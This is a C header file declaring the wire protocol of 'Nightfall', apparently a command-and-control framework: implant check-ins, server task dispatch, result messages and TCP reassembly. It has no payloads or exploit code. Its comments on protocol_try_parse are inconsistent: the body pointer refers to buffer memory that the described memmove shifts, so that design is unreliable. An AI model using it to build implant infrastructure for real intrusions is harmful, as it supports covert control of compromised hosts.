#ifndef PROTOCOL_H
#define PROTOCOL_H

#include "config.h"
#include "types.h"
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

// msg_header_t - The fixed 12-byte header that starts every
// Nightfall message.
//
// On the wire, all three fields are uint32_t in network byte order
// (big-endian). Use protocol_pack_header() to convert to network byte order
// before sending.
typedef struct {
    uint32_t magic;
    uint32_t msg_type;
    uint32_t body_len;
} msg_header_t;

// recv_buf_t - Accumulates bytes from TCP reads until complete messages form.
// Per-connection buffer that accumulates TCP reads until a complete
// message can be parsed out.
//
// buf: raw byte storage, fixed size
// len: how many bytes in buf are valid data right now (not capacity)
typedef struct {
    uint8_t buf[MAX_MSG_SIZE];
    size_t len;
} recv_buf_t;

// ── Recv buffer ────────────────────────────────────────────────

// Zero out a recv buffer. Call once when a new connection is established.
void recv_buf_reset(recv_buf_t *rbuf);

// ── Pack functions ─────────────────────────────────────────────
// Each pack function writes raw bytes into buf in network byte order.
// Returns the number of bytes written, or -1 on error.
// The caller is responsible for ensuring buf is large enough.
//
// Pattern: the caller allocates a buffer (typically MAX_MSG_SIZE),
// calls the body packer first (writes at buf + NIGHTFALL_HDR_SIZE),
// then calls protocol_pack_header() to write the first 12 bytes
// using the body length returned by the body packer.
// Total bytes on the wire = NIGHTFALL_HDR_SIZE + body bytes returned.

// Pack the 12-byte header at buf[0..11].
// Called AFTER the body packer, because you need body_len.
int protocol_pack_header(uint8_t *buf, msg_type_t type, uint32_t body_len);

// Pack MSG_CHECKIN body: session_id(8B) + hostname_len(4B) + hostname.
// Implant calls this at beacon checkin time.
int protocol_pack_checkin(uint8_t *buf, uint64_t session_id,
                          const char *hostname, uint32_t hostname_len);

// Pack MSG_CHECKIN_ACK body: task_count(4B).
// Server sends this in response to a checkin, followed by
// task_count(example: 3) individual MSG_TASK messages.
// Tells implant how many MSG_TASK messages to expect next. 
int protocol_pack_checkin_ack(uint8_t *buf, uint32_t task_count);

// Pack MSG_TASK body: task_type(4B) + args_len(4B) + args.
// Server calls this when dispatching a queued task.
int protocol_pack_task(uint8_t *buf, task_type_t type, const char *args,
                       uint32_t args_len);

// Pack MSG_RESULT body: task_type(4B) + status(4B) + data_len(4B) + data.
// Implant calls this after executing a task.
int protocol_pack_result(uint8_t *buf, task_type_t type, int32_t status,
                         const uint8_t *data, uint32_t data_len);

// ── Unpack functions ───────────────────────────────────────────
// Each unpack function reads raw bytes from buf, converts from
// network byte order to host byte order, and writes to output params.
// Returns 0 on success, -1 on error (e.g. body too short).
// len is the body length (not including the header).

// Unpack the 12-byte header. Validates magic field.
// Returns -1 if magic does not match NIGHTFALL_MAGIC.
int protocol_unpack_header(const uint8_t *buf, msg_header_t *hdr);

// Unpack MSG_CHECKIN body.
int protocol_unpack_checkin(const uint8_t *buf, size_t len,
                            uint64_t *session_id, char *hostname,
                            uint32_t *hostname_len);

// Unpack MSG_CHECKIN_ACK body.
int protocol_unpack_checkin_ack(const uint8_t *buf, size_t len,
                                uint32_t *task_count);

// Unpack MSG_TASK body.
int protocol_unpack_task(const uint8_t *buf, size_t len, task_type_t *type,
                         char *args, uint32_t *args_len);

// Unpack MSG_RESULT body.
int protocol_unpack_result(const uint8_t *buf, size_t len, task_type_t *type,
                           int32_t *status, uint8_t *data, uint32_t *data_len);

// ── TCP reassembly ─────────────────────────────────────────────

// protocol_try_parse - Check if recv_buf contains a complete message.
//
// Called after every recv(). Inspects the accumulated bytes in rbuf:
//   1. If < NIGHTFALL_HDR_SIZE bytes: return false (need more data)
//   2. Unpack header, validate magic, read body_len
//   3. If < NIGHTFALL_HDR_SIZE + body_len bytes: return false
//   4. Populate out_hdr with the unpacked header
//   5. Set *out_body to point at rbuf->buf + NIGHTFALL_HDR_SIZE
//   6. Set *out_body_len to hdr.body_len
//   7. memmove() any leftover bytes to the front of rbuf
//   8. Adjust rbuf->len and return true
//
// IMPORTANT: *out_body points into rbuf's internal buffer.
// You must unpack the body BEFORE the next recv() call,
// because recv() will append to / overwrite that memory.
bool protocol_try_parse(recv_buf_t *rbuf, msg_header_t *out_hdr,
                        const uint8_t **out_body, uint32_t *out_body_len);

#endif